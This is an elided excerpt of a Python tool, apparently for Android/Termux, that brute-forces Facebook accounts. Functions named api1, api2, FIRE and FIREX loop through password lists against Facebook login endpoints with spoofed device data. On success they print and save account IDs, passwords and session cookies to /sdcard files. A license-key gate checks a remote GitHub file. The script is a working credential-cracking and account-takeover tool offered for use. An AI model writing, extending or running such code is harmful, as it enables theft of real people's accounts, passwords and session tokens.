...
#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/mdalamintalukdar12/main/version.txt').text
version = str(vers)
#-------------------------------#
#os.system('xdg-open https://www.facebook.com/profile.php?id=100080044396459')
logo = (f"""
\x1b[38;5;46m.#####....####....####....####..
\x1b[38;5;47m.##..##..##..##..##......##.....
\x1b[38;5;48m.#####...##..##...####....####..
...
\x1b[38;5;50m.#####....####....####....####..
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    : MD NUMAN             
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  : MD NUMAN            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    : NUMAN-404             {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
...
try:
    os.system('clear')
    xnx = requests.get('https://github.com/mdalamintalukdar12/raja/blob/main/raja.txt').text
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/mdalamintalukdar12/raja/blob/main/raja.txt').text    
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801966506561?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/boss.txt  etc..')
				linex()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100080044396459');menu()
			elif xd in ['4','04']:os.system('xdg-open https://www.facebook.com/profile.php?id=100080044396459');menu()
			elif xd in ['5','05']:os.system('xdg-open https://www.facebook.com/profile.php?id=100080044396459');menu()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {boss}[{G}BOSS-M2{boss}]-[{G}%s{boss}]-[{G}OK:%s{boss}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {boss}[{G}BOSS-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/BOSS-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[BOSS-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[BOSS-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {boss}[{G}BOSS-M1{boss}]-[{G}%s{boss}]-[{G}OK:%s{boss}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {boss}[{G}BOSS-OK{boss}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/BOSS-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBOSS-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            data={'adid': str(uuid.uuid4()),
                    ...
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':mdalamintalukdar12(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {boss}[{G}BOSS-OK{boss}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {boss}[{G}•{boss}]{G} '+kuki+'')
                linex()
                open('/sdcard/BOSS-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBOSS-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                linex()
                open('/sdcard/BOSS-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BOSS-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
